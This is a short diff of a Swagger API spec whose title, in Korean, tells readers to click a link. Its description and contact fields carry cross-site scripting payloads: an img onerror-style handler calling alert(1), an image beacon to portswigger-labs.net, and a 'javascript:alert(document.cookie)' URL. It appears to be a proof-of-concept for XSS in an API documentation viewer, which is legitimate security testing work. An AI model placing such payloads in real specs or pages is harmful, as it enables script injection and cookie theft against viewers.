@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "아래 [kakaovx 홈으로 이동] 링크를 클릭하세요",
-  "description": "</p><img referrerpolicy='no-referrer' src='https://portswigger-labs.net'>XS&#x0000003AS<p>"},
+  "description": "</p><img src @error=e=$event.path.pop().alert(1)>XS&#x0000003AS<p>"},
   "contact": 
   {"name": "AHNLAB",
     "url": "javascript:alert(document.cookie)",
